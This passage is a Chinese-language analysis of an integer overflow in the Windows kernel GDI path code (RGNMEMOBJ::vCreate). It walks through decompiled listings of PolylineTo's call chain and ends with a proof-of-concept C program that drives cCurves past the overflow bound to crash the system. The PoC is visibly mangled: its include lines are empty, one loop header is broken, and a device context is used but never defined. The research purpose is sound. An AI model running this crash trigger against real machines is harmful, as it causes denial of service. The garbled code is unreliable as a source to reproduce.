        if ( v6 )
        {
          *((_DWORD *)this + 1) = *(_DWORD *)(v6 + 0x44);
          *((_DWORD *)this + 0) = *(_DWORD *)(v6 + 0x40);
          ...
        }
      ...
      }
清单 3-5 构造函数 PATHSTACKOBJ::PATHSTACKOBJ 对成员变量的初始化
不关注构造函数中后续的其他初始化操作，回到 `GrePolylineTo` 函数中并关注 `EPATHOBJ::bPolyLineTo`
函数调用。`EPATHOBJ::bPolyLineTo` 执行具体的从 `DC` 对象的当前位置点到指定点的画线操作。如清单 3-4 所示，传入的第 4
个参数 `a3` 是由 `NtGdiPolyPolyDraw` 函数传入的线条数目 `ulCount` 变量；此时作为其 `a4` 参数的值传入
`EPATHOBJ::bPolyLineTo` 函数调用。
* * *
**EPATHOBJ::bPolyLineTo**
函数 `EPATHOBJ::bPolyLineTo` 通过调用 `EPATHOBJ::addpoints`
执行将目标的点添加到路径中的具体操作。执行成功后，将参数 `a4` 的值增加到成员变量 `cCurves` 中：
      if ( *((_DWORD *)this + 2) )
      {
        v6 = 0;
        v8 = a3;
        v7 = a4;
        result = EPATHOBJ::addpoints(this, a2, (struct _PATHDATAL *)&v6);
        if ( result )
          *((_DWORD *)this + 1) += a4;
      }
清单 3-6 函数 EPATHOBJ::bPolyLineTo 增加成员变量 cCurves 的值
函数 `EPATHOBJ::addpoints` 主要通过调用函数 `EPATHOBJ::growlastrec` 和
`EPATHOBJ::createrec` 实现功能：
      if ( !(*(_BYTE *)(*((_DWORD *)this + 2) + 0x34) & 1) )
        EPATHOBJ::growlastrec(this, a2, a3, 0);
      while ( *((_DWORD *)a3 + 1) > 0u )
      {
        if ( !EPATHOBJ::createrec(v3, a2, a3, 0) )
          return 0;
      }
清单 3-7 函数 EPATHOBJ::addpoints 代码片段
系统在 `PATH` 对象中通过一个或多个 `PATHRECORD` 记录存储一组或多组路径数据；从第 2 个开始的 `PATHRECORD` 记录项作为第
1 个记录项的延续。初始情况下，当前 `PATH` 对象并未包含任何 `PATHRECORD` 项，此时在调用 `EPATHOBJ::addpoints`
函数时会跳过 `EPATHOBJ::growlastrec` 调用而直接执行到 `EPATHOBJ::createrec` 函数。
    type struct  _POINTFIX {
        ULONG x;
        ULONG y;
    } POINTFIX, *PPOINTFIX;
    struct _PATHRECORD {
        struct _PATHRECORD *pprnext;
        struct _PATHRECORD *pprprev;
        FLONG    flags;
        ULONG    count;
        POINTFIX aptfx[2]; // at least 2 points
    };
清单 3-8 PATHRECORD 结构定义
函数 `EPATHOBJ::createrec` 创建并初始化新的 `PATHRECORD` 记录项，并将其添加到 `PATH` 对象中。函数中会判断当前
`PATH` 对象是否属于初始状态，如果属于初始状态则将前置初始点数量 `cPoints` 变量置为 `1` 并随后将初始坐标点首先安置在新构造的
`PATHRECORD` 记录中作为最开始的坐标点，该初始坐标点稍早时在构造函数中通过目标 `DC`
对象的当前位置坐标点初始化；由用户传入的坐标点序列将紧随其后被逐项安置在 `PATHRECORD` 记录中。在处理并存储坐标点数据时，各坐标点的 X 轴和
Y 轴数值都被左移 `4` 位。
      cPoints = *((_DWORD *)ppath + 0xD) & 1;
      ...
      if ( cPoints )
      {
        ppath = *((_DWORD *)this + 2);
        *((_DWORD *)ppr + 4) = *(_DWORD *)(ppath + 0x2C);
        *((_DWORD *)ppr + 5) = *(_DWORD *)(ppath + 0x30);
        --maxadd;
        *((_DWORD *)ppr + 2) = flags | *(_DWORD *)(*((_DWORD *)this + 2) + 0x34) & 5;
        *(_DWORD *)(*((_DWORD *)this + 2) + 0x34) &= 0xFFFFFFFA;
      }
      else
      {
        ppath = *((_DWORD *)this + 2);
        if ( *(_DWORD *)(ppath + 0x18) != 0 )
          *(_DWORD *)(*(_DWORD *)(ppath + 0x18) + 8) &= 0xFFFFFFFD;
      }
      v19 = (struct PATHRECORD *)((char *)ppr + 8 * cPoints + 0x10);
清单 3-9 函数 EPATHOBJ::createrec 将初始点安置在 PATHRECORD 坐标点序列起始位置
在安置初始坐标点的同时，函数会清除目标 `PATH` 对象的代表初始状态的标志位；后续再次针对当前 `PATH` 对象调用到
`EPATHOBJ::addpoints` 时，将会首先进入 `EPATHOBJ::growlastrec`
调用，由用户传入的坐标点序列将被优先追加到原有的 `PATHRECORD` 记录中；当原有的记录的坐标点缓冲区存满时，才会进入后续的
`EPATHOBJ::createrec` 调用，创建新的作为前一个 `PATHRECORD` 记录延续的记录项。
* * *
**析构函数**
在 `EPATHOBJ::~EPATHOBJ` 析构函数中会将 `EPATHOBJ` 对象的 `cCurves` 成员存储的更新后的曲线数目回置给关联的
`PATH` 对象中的 `cCurves` 域中：
      ppath = ((_DWORD *)this + 2);
      if ( *((_DWORD *)this + 2) )
      {
        *(_DWORD *)(*(_DWORD *)ppath + 0x44) = *((_DWORD *)this + 1);
        *(_DWORD *)(*(_DWORD *)ppath + 0x40) = *((_DWORD *)this + 0);
        ppath = DEC_SHARE_REF_CNT(*(_DWORD *)ppath);
      }
清单 3-10 析构函数 EPATHOBJ::~EPATHOBJ 回置 cCurves 域的值
另外注意到在 `EPATHSTACKOBJ::~EPATHSTACKOBJ` 析构函数中也存在类似的回置逻辑，但其需判断当前 `EPATHSTACKOBJ`
对象是否属于 `PATHTYPE_STACK` 类型，在本分析所涉及的调用中并未涉及到该类型，所以只在父类 `EPATHOBJ` 的析构函数中回置相关域。
* * *
**调用路径**
根据上面的分析可知，通过适当调用 `gdi32!PolylineTo` 即可增加目标 `DC` 对象关联的 `PATH` 对象中 `cCurves`
域的值，该值直接影响到调用漏洞所在函数 `RGNMEMOBJ::vCreate` 分配内存缓冲区的大小。所以通过精巧构造的 POC 应可实现漏洞的触发。从
`PolylineTo` 到 `EPATHOBJ::bPolyLineTo` 的调用路径：
图 3-1 从 PolylineTo 到 EPATHOBJ::bPolyLineTo 调用路径
#### 0x4 验证
根据前面章节的分析和追踪，在本章节尝试对该漏洞的机理进行验证。
在 `Windows` 系统中，`ULONG` 类型的整数最大值为 `0xFFFFFFFF`，超过该范围将会发生整数向上溢出，溢出发生后仅保留计算结果的低
`32` 位数据，超过 `32` 位的数据将丢失。例如：
    0xFFFF FFFF + 0x1 = 0x(1) 0000 0000 = 0x0
在本漏洞所在的现场，传入 `ExAllocatePoolWithTag` 的参数：
    NumberOfBytes = 0x28 * (v6 + 1)
要使 `NumberOfBytes` 参数满足 `32` 位整数溢出的条件，需要满足：
    0x28 * (v6 + 1) > 0xFFFFFFFF
解该不等式得到 `v6 > 0x‭6666665‬` 的结果。
在 `RGNMEMOBJ::vCreate` 函数的开始位置调用的 `EPATHOBJ::vCloseAllFigure` 成员函数，用来遍历
`PATHRECORD` 列表中的每个条目，并将所有未处于闭合状态的记录项设置为闭合状态。设置闭合状态表示将末尾的坐标点和起始坐标点相连接，所以需要同时对
`cCurves` 成员变量加一。
      for ( ppr = *(struct PATHRECORD **)(*((_DWORD *)this + 2) + 0x14); ppr; ppr = *(struct PATHRECORD **)ppr )
      {
        v2 = *((_DWORD *)ppr + 2);
        if ( v2 & 2 )
        {
          if ( !(v2 & 8) )
          {
            *((_DWORD *)ppr + 2) = v2 | 8;
            ++*((_DWORD *)this + 1);
          }
        }
      }
清单 4-1 闭合 PATHRECORD 记录时对 cCurves 成员变量加一
形成闭合图形之后，边的数目应和顶点的数目相等；而根据前面的章节可知，在调用 `EPATHOBJ::createrec` 函数创建初始
`PATHRECORD` 记录时，将源自于设备上下文的起始坐标点作为 `PATH` 对象的顶点序列的最开始的坐标点，这导致执行到漏洞关键位置时，变量
`v6` 的值比由用户进程传入的线条数目大 `1`。所以在用户进程中传递的画线数目只需大于 `0x6666664` 就能够满足溢出条件。但根据图 3-2
所示，传入的线条总数不能大于 `0x4E2000` 数值，否则将直接返回失败。所以在验证代码中可以分为多次调用。
漏洞验证逻辑如下：
图 4-1 漏洞验证逻辑
漏洞验证代码如下：
    #include 
    #include 
    #include 
    CONST LONG maxCount = 0x6666665;
    CONST LONG maxLimit = 0x4E2000;
    static POINT point[maxCount] = { 0 };
    int main(int argc, char *argv[])
    {
        BOOL ret = FALSE;
        for (LONG i = 0; i  0; i -= min(maxLimit, i))
        {
            ret = PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i));
        }
        EndPath(hdc); // deactivate the path
        HRGN hRgn = PathToRegion(hdc);
        return 0;
    }
清单 4-2 漏洞验证代码
在清单 4-2 的代码中，我将绘制的线条数目设置为 `0x6666665`，这将导致在 `RGNMEMOBJ::vCreate`
函数中计算分配缓冲区大小时发生整数溢出，缓冲区分配大小的数值成为 `0x18`。代码编译后在目标系统中执行，由整数溢出引发的 OOB 漏洞导致的系统
BSOD 在稍等片刻之后便会触发：
图 4-2 整数溢出引发 OOB 导致系统 BSOD 触发
* * *